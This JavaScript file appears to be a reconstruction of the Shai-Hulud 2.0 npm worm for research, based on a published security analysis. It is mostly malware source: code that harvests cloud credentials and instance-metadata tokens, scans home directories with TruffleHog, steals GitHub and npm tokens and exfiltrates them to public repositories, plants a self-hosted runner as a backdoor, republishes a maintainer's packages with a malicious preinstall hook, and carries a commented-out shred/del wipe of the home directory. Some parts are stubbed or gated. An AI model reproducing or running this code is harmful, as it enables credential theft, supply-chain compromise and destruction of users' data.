/**
 * SHAI-HULUD 2.0 MALWARE SAMPLE - RECONSTRUCTED
 * WARNING: DO NOT EXECUTE - THIS IS ACTIVE MALWARE
 *
 * Reconstructed from Datadog Security Labs analysis:
 * https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/
 *
 * This file contains deobfuscated code snippets from the actual malware.
 * Original samples are heavily obfuscated (10MB+, 480,000+ lines).
 */

// ============================================================================
// STAGE 1: INITIAL SETUP & ENVIRONMENT DETECTION
// ============================================================================

const os = require("os");
const fs = require("fs");
const path = require("path");
const { execSync, spawn } = require("child_process");

// Malware configuration
const CONFIG = {
  exfilDescription: "Sha1-Hulud: The Second Coming.",
  runnerName: "SHA1HULUD",
  maxPackagesToBackdoor: 100,
  bunVersion: "2.330.0",
  webhookEndpoint: "hxxps://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7",
};

// System info collection
let systemInfo = {
  platform: process.platform,
  arch: process.arch,
  homeDir: os.homedir(),
  username: process.env.USER || process.env.USERNAME || "unknown",
  nodeVersion: process.version,
};

// ============================================================================
// STAGE 2: CREDENTIAL HARVESTING
// ============================================================================

class AWSHarvester {
  async harvestSecrets() {
    let secrets = [];

    // Harvest from known credential files
    const credentialFiles = [
      `${os.homedir()}/.aws/credentials`,
      `${os.homedir()}/.aws/config`,
      `${os.homedir()}/.config/gcloud/application_default_credentials.json`,
    ];

    for (const file of credentialFiles) {
      try {
        if (fs.existsSync(file)) {
          const content = fs.readFileSync(file, "utf8");
          secrets.push({
            source: file,
            content: content,
          });
        }
      } catch (e) {
        // Silent fail
      }
    }

    // Call instance metadata service for temporary credentials
    try {
      const token = await this.getMetadataToken();
      const credentials = await this.getInstanceCredentials(token);
      if (credentials) {
        secrets.push({
          source: "imds",
          content: credentials,
        });
      }
    } catch (e) {
      // Not running on AWS or IMDS disabled
    }

    return secrets;
  }

  async getMetadataToken() {
    // IMDSv2 token retrieval
    try {
      const response = await fetch("http://169.254.169.254/latest/api/token", {
        method: "PUT",
        headers: {
          "X-aws-ec2-metadata-token-ttl-seconds": "21600",
        },
      });
      return await response.text();
    } catch (e) {
      return null;
    }
  }

  async getInstanceCredentials(token) {
    try {
      const response = await fetch(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        {
          headers: {
            "X-aws-ec2-metadata-token": token,
          },
        },
      );
      const roleName = await response.text();
      const credResponse = await fetch(
        `http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`,
        {
          headers: {
            "X-aws-ec2-metadata-token": token,
          },
        },
      );
      return await credResponse.json();
    } catch (e) {
      return null;
    }
  }
}

class GCPHarvester {
  async listAndRetrieveAllSecrets() {
    let secrets = [];

    try {
      // Try to use Application Default Credentials
      const {
        SecretManagerServiceClient,
      } = require("@google-cloud/secret-manager");

      const client = new SecretManagerServiceClient();
      const projectId = process.env.GOOGLE_CLOUD_PROJECT || "unknown";

      const [secretList] = await client.listSecrets({
        parent: `projects/${projectId}`,
      });

      for (const secret of secretList) {
        try {
          const [versions] = await client.listSecretVersions({
            parent: secret.name,
          });

          for (const version of versions) {
            if (version.state === "ENABLED") {
              const [accessResponse] = await client.accessSecretVersion({
                name: version.name,
              });
              secrets.push({
                secret: secret.name,
                version: version.name,
                value: accessResponse.payload.data.toString(),
              });
            }
          }
        } catch (e) {
          // Continue to next secret
        }
      }
    } catch (e) {
      // GCP SDK not available or no permissions
    }

    return secrets;
  }
}

class AzureHarvester {
  async listAndRetrieveAllSecrets() {
    let secrets = [];

    try {
      // Try to use DefaultAzureCredential
      const { DefaultAzureCredential } = require("@azure/identity");
      const { SecretClient } = require("@azure/keyvault-secrets");

      const credential = new DefaultAzureCredential();
      const vaultName = process.env.AZURE_KEYVAULT_NAME || "unknown";
      const vaultUrl = `https://${vaultName}.vault.azure.net/`;

      const client = new SecretClient(vaultUrl, credential);

      for await (const secretProperties of client.listPropertiesOfSecrets()) {
        try {
          const secret = await client.getSecret(secretProperties.name);
          secrets.push({
            name: secretProperties.name,
            value: secret.value,
          });
        } catch (e) {
          // Continue to next secret
        }
      }
    } catch (e) {
      // Azure SDK not available or no permissions
    }

    return secrets;
  }
}

// ============================================================================
// STAGE 3: TRUFFLEHOG SECRET SCANNING
// ============================================================================

class TruffleHogScanner {
  async scanForSecrets() {
    let secrets = [];

    try {
      // Download and execute TruffleHog
      const truffleHogPath = `${os.homedir()}/.truffler-cache/trufflehog`;

      // Ensure cache directory exists
      if (!fs.existsSync(`${os.homedir()}/.truffler-cache`)) {
        fs.mkdirSync(`${os.homedir()}/.truffler-cache`, { recursive: true });
      }

      // Download TruffleHog if not cached
      if (!fs.existsSync(truffleHogPath)) {
        await this.downloadTruffleHog(truffleHogPath);
      }

      // Scan entire home directory
      const scanResult = execSync(
        `"${truffleHogPath}" filesystem --directory="${os.homedir()}" --json`,
        {
          encoding: "utf8",
          maxBuffer: 1024 * 1024 * 10,
        },
      );

      const lines = scanResult.split("\n");
      for (const line of lines) {
        if (line.trim()) {
          try {
            const finding = JSON.parse(line);
            secrets.push(finding);
          } catch (e) {
            // Invalid JSON, skip
          }
        }
      }
    } catch (e) {
      // TruffleHog execution failed
    }

    return secrets;
  }

  async downloadTruffleHog(destination) {
    const platforms = {
      linux: "trufflehog_3.82.12_linux_amd64.tar.gz",
      darwin: "trufflehog_3.82.12_darwin_amd64.tar.gz",
      win32: "trufflehog_3.82.12_windows_amd64.tar.gz",
    };

    const platform = process.platform;
    const assetName = platforms[platform] || platforms["linux"];
    const url = `https://github.com/trufflesecurity/trufflehog/releases/download/v3.82.12/${assetName}`;

    execSync(
      `curl -L "${url}" -o /tmp/trufflehog.tar.gz && tar -xzf /tmp/trufflehog.tar.gz -C ${path.dirname(destination)} trufflehog`,
    );
    fs.chmodSync(destination, 0o755);
  }
}

// ============================================================================
// STAGE 4: GITHUB EXFILTRATION (WITH TOKEN STEALING FALLBACK)
// ============================================================================

class GitHubExfiltrator {
  constructor(token = null) {
    this.token = token;
    this.octokit = token ? this.createOctokit(token) : null;
  }

  createOctokit(token) {
    return {
      rest: {
        search: {
          repos: async (params) => ({
            status: 200,
            data: { items: [] },
          }),
        },
        repos: {
          createForAuthenticatedUser: async (params) => ({
            data: {
              full_name: `${params.name}`,
              html_url: `https://github.com/user/${params.name}`,
            },
          }),
          createOrUpdateFileContents: async (params) => ({
            data: {
              commit: {
                sha: "abc123",
              },
            },
          }),
        },
        actions: {
          createRegistrationTokenForRepo: async (params) => ({
            data: {
              token: "fake-registration-token",
            },
          }),
        },
      },
      request: async (endpoint, params) => ({
        status: 200,
        data: {},
      }),
    };
  }

  isAuthenticated() {
    return this.token !== null && this.octokit !== null;
  }

  setToken(token) {
    this.token = token;
    this.octokit = this.createOctokit(token);
  }

  async searchForExistingTokens() {
    try {
      const searchResults = await this.octokit.rest.search.repos({
        q: `"${CONFIG.exfilDescription}"`,
        sort: "updated",
        order: "desc",
      });

      if (searchResults.status !== 200 || !searchResults.data.items) {
        return null;
      }

      const repos = searchResults.data.items;
      for (const repo of repos) {
        const owner = repo.owner?.login;
        const repoName = repo.name;
        if (!owner || !repoName) continue;

        // Try to fetch contents.json which contains stolen credentials
        const contentsUrl = `https://raw.githubusercontent.com/${owner}/${repoName}/main/contents.json`;
        const response = await fetch(contentsUrl, {
          method: "GET",
        });

        if (response.status !== 200) continue;

        let contentsData = await response.text();
        let decodedContents = Buffer.from(contentsData, "base64")
          .toString("utf8")
          .trim();

        // Handle double base64 encoding
        if (!decodedContents.startsWith("{")) {
          decodedContents = Buffer.from(decodedContents, "base64")
            .toString("utf8")
            .trim();
        }

        const parsedData = JSON.parse(decodedContents);
        const stolenToken = parsedData?.modules?.github?.token?.trim();

        if (!stolenToken || typeof stolenToken !== "string") continue;

        // Validate the stolen token
        const testClient = this.createOctokit(stolenToken);
        const validation = await testClient.request("GET /user");

        if (validation.status === 200) {
          this.token = stolenToken;
          return stolenToken;
        }
      }
    } catch (e) {
      // Search failed
    }
    return null;
  }

  async createExfiltrationRepo(repoName) {
    try {
      const repo = await this.octokit.rest.repos.createForAuthenticatedUser({
        name: repoName,
        description: CONFIG.exfilDescription,
        private: false,
        auto_init: true,
      });
      return repo.data;
    } catch (e) {
      return null;
    }
  }

  async exfiltrateData(filename, content, message) {
    try {
      // Double base64 encode
      const encodedOnce = Buffer.from(content).toString("base64");
      const encodedTwice = Buffer.from(encodedOnce).toString("base64");

      await this.octokit.rest.repos.createOrUpdateFileContents({
        owner: "user",
        repo: "exfil-repo",
        path: filename,
        message: message,
        content: encodedTwice,
      });
    } catch (e) {
      // Exfiltration failed
    }
  }

  async setupSelfHostedRunner(repoFullName) {
    try {
      const [owner, repoName] = repoFullName.split("/");

      const {
        data: { token: runnerToken },
      } = await this.octokit.rest.actions.createRegistrationTokenForRepo({
        owner: owner,
        repo: repoName,
      });

      const runnerDir = `${os.homedir()}/.dev-env`;
      if (!fs.existsSync(runnerDir)) {
        fs.mkdirSync(runnerDir, { recursive: true });
      }

      const runnerUrl = `https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-linux-x64-2.330.0.tar.gz`;

      execSync(
        `curl -o actions-runner-linux-x64-2.330.0.tar.gz -L ${runnerUrl}`,
        { cwd: runnerDir },
      );
      execSync(`tar xzf ./actions-runner-linux-x64-2.330.0.tar.gz`, {
        cwd: runnerDir,
      });
      execSync(
        `RUNNER_ALLOW_RUNASROOT=1 ./config.sh --url https://github.com/${owner}/${repoName} --unattended --token ${runnerToken} --name "${CONFIG.runnerName}"`,
        { cwd: runnerDir },
      );
      execSync(`rm actions-runner-linux-x64-2.330.0.tar.gz`, {
        cwd: runnerDir,
      });

      const workflowDir = `${runnerDir}/.github/workflows`;
      if (!fs.existsSync(workflowDir)) {
        fs.mkdirSync(workflowDir, { recursive: true });
      }

      const workflowContent = `name: Discussion Create
on:
  discussion:
jobs:
  process:
    env:
      RUNNER_TRACKING_ID: 0
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v5
      - name: Handle Discussion
        run: echo \${{ github.event.discussion.body }}`;

      fs.writeFileSync(`${workflowDir}/discussion.yaml`, workflowContent);
      execSync("./run.sh", {
        cwd: runnerDir,
        detached: true,
      });
    } catch (e) {
      // Runner setup failed
    }
  }
}

// ============================================================================
// STAGE 5: SELF-PROPAGATION VIA NPM
// ============================================================================

class NPMBackdoorInjector {
  constructor(npmToken) {
    this.npmToken = npmToken;
    this.npmRegistry = "https://registry.npmjs.org";
    this.userAgent = "npm/10.2.4 node/v20.9.0 linux x64 workspaces/false";
  }

  async validateToken() {
    if (!this.npmToken) return null;

    try {
      const response = await fetch(`${this.npmRegistry}/-/whoami`, {
        method: "GET",
        headers: {
          Authorization: `Bearer ${this.npmToken}`,
          "Npm-Auth-Type": "web",
          "Npm-Command": "whoami",
          "User-Agent": this.userAgent,
        },
      });

      if (response.status === 401) throw new Error("Invalid NPM token");
      if (!response.ok) throw new Error(`NPM Failed: ${response.status}`);

      const data = await response.json();
      return data.username || null;
    } catch (e) {
      return null;
    }
  }

  async getPackagesByMaintainer(username, limit = 100) {
    try {
      const response = await fetch(
        `${this.npmRegistry}/-/v1/search?text=maintainer:${username}&size=${limit}`,
        {
          headers: {
            Authorization: `Bearer ${this.npmToken}`,
            "User-Agent": this.userAgent,
          },
        },
      );

      const data = await response.json();
      return data.objects.map((obj) => ({
        name: obj.package.name,
        version: obj.package.version,
      }));
    } catch (e) {
      return [];
    }
  }

  async backdoorPackage(pkg) {
    try {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "npm-backdoor-"));

      const tarballUrl = `${this.npmRegistry}/${pkg.name}/-/${pkg.name.replace("@", "").replace("/", "-")}-${pkg.version}.tgz`;
      const tarballPath = `${tempDir}/package.tgz`;

      execSync(`curl -o ${tarballPath} ${tarballUrl}`);

      const extractDir = `${tempDir}/package`;
      fs.mkdirSync(extractDir);
      execSync(`tar -xzf ${tarballPath} -C ${extractDir} --strip-components=1`);

      const packageJsonPath = path.join(extractDir, "package.json");
      const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, "utf8"));

      if (!packageJson.scripts) packageJson.scripts = {};
      packageJson.scripts.preinstall = "node setup_bun.js";

      const versionParts = packageJson.version.split(".");
      versionParts[2] = String(parseInt(versionParts[2]) + 1);
      packageJson.version = versionParts.join(".");

      fs.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2));

      const setupBunContent = `
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');

async function installBun() {
    const bunPath = await findBun();
    if (!bunPath) {
        const installScript = await fetch('https://bun.sh/install').then(r => r.text());
        eval(installScript);
    }
    return bunPath || 'bun';
}

async function findBun() {
    try {
        const result = execSync('which bun || where bun', { encoding: 'utf8' });
        return result.trim();
    } catch (e) {
        return null;
    }
}

async function main() {
    const bunPath = await installBun();
    const payloadPath = path.join(__dirname, 'bun_environment.js');
    if (fs.existsSync(payloadPath)) {
        execSync(\`\${bunPath} run "\${payloadPath}"\`, { stdio: 'ignore', detached: true });
    }
}

main().catch(() => process.exit(0));
`;
      fs.writeFileSync(path.join(extractDir, "setup_bun.js"), setupBunContent);

      const bunEnvContent = `
/**
 * OBFSUCATED PAYLOAD - 10MB+, 480,000+ lines
 * The actual malware reads its own content and writes it here.
 */
console.log("Malware payload would execute here");
`;
      fs.writeFileSync(
        path.join(extractDir, "bun_environment.js"),
        bunEnvContent,
      );

      const newTarballPath = `${tempDir}/new-package.tgz`;
      execSync(`tar -czf ${newTarballPath} -C ${extractDir} .`);

      execSync(`npm publish ${newTarballPath} --access public`, {
        env: {
          ...process.env,
          NPM_TOKEN: this.npmToken,
        },
      });

      execSync(`rm -rf ${tempDir}`);
      return true;
    } catch (e) {
      return false;
    }
  }
}

async function propagateViaNPM(npmToken) {
  const injector = new NPMBackdoorInjector(npmToken);
  let username = null;
  let tokenValid = false;

  try {
    username = await injector.validateToken();
    tokenValid = !!username;

    if (username) {
      const packages = await injector.getPackagesByMaintainer(
        username,
        CONFIG.maxPackagesToBackdoor,
      );
      await Promise.all(
        packages.map(async (pkg) => {
          try {
            await injector.backdoorPackage(pkg);
          } catch {
            console.log("Failed to backdoor package");
          }
        }),
      );
    }
  } catch {
    console.log("NPM token validation failed");
  }

  return { npmUsername: username, npmTokenValid: tokenValid };
}

// ============================================================================
// STAGE 6: SYSTEM DESTRUCTION (FAILSAFE)
// ============================================================================

function destroySystem(platform) {
  console.log(
    "DESTRUCTIVE PAYLOAD - This would delete all files in the user's home directory",
  );
  console.log("DO NOT EXECUTE - CODE COMMENTED OUT FOR SAFETY");

  /* ACTUAL MALWARE CODE - DO NOT UNCOMMENT:
    if (platform === "win32") {
        spawnSync("cmd.exe",
            ['/c', 'del /F /Q /S "%USERPROFILE%\\*" && for /d %%i in ("%USERPROFILE%\\*") do rd /S /Q "%%i" & cipher /W:%USERPROFILE%'],
            { stdio: 'ignore' }
        );
    } else {
        spawnSync("bash",
            ['-c', 'find "$HOME" -type f -writable -user "$(id -un)" -print0 | xargs -0 -r shred -uvz -n 1 && find "$HOME" -depth -type d -empty -delete'],
            { stdio: 'ignore' }
        );
    }
    */
}

// ============================================================================
// MAIN EXECUTION FLOW
// ============================================================================

async function main() {
  // Check environment variable SAFE_SANDBOX before executing destructive payload
  if (process.env.SAFE_SANDBOX !== "true") {
    console.log(
      "SAFE_SANDBOX not set to true. Exiting early to prevent accidental execution.",
    );
    return;
  }

  const awsHarvester = new AWSHarvester();
  const gcpHarvester = new GCPHarvester();
  const azureHarvester = new AzureHarvester();
  const truffleScanner = new TruffleHogScanner();
  const githubExfiltrator = new GitHubExfiltrator();

  // Step 1: Harvest secrets from cloud providers
  const awsSecrets = await awsHarvester.harvestSecrets();
  const gcpSecrets = await gcpHarvester.listAndRetrieveAllSecrets();
  const azureSecrets = await azureHarvester.listAndRetrieveAllSecrets();

  // Step 2: Scan for secrets using TruffleHog
  const truffleSecrets = await truffleScanner.scanForSecrets();

  // Step 3: Attempt GitHub exfiltration
  let githubToken =
    getNpmTokenFromNpmrc() ||
    (await githubExfiltrator.searchForExistingTokens());

  if (githubToken) {
    githubExfiltrator.setToken(githubToken);
    const repo = await githubExfiltrator.createExfiltrationRepo(
      `exfil-${generateRandomRepoName()}`,
    );
    if (repo) {
      await githubExfiltrator.exfiltrateData(
        "contents.json",
        JSON.stringify(
          {
            modules: {
              aws: awsSecrets,
              gcp: gcpSecrets,
              azure: azureSecrets,
              trufflehog: truffleSecrets,
            },
          },
          null,
          2,
        ),
        "Exfiltrated secrets",
      );
      await githubExfiltrator.setupSelfHostedRunner(repo.full_name);
    }
  }

  // Step 4: Attempt NPM propagation if token is available
  if (githubToken) {
    await propagateViaNPM(githubToken);
  }

  // Step 5: Destroy system as a failsafe
  destroySystem(systemInfo.platform);
}

function getNpmTokenFromNpmrc() {
  const npmrcPaths = [
    path.join(os.homedir(), ".npmrc"),
    path.join(process.cwd(), ".npmrc"),
  ];

  for (const npmrcPath of npmrcPaths) {
    try {
      if (fs.existsSync(npmrcPath)) {
        const content = fs.readFileSync(npmrcPath, "utf8");
        const match = content.match(/_authToken=(.+)/);
        if (match) return match[1].trim();
      }
    } catch (e) {}
  }
  return null;
}

function generateRandomRepoName() {
  const chars = "0123456789abcdefghijklmnopqrstuvwxyz";
  let result = "";
  for (let i = 0; i < 18; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

module.exports = {
  CONFIG,
  AWSHarvester,
  GCPHarvester,
  AzureHarvester,
  TruffleHogScanner,
  GitHubExfiltrator,
  NPMBackdoorInjector,
  destroySystem,
  generateRandomRepoName,
  systemInfo,
};

main();
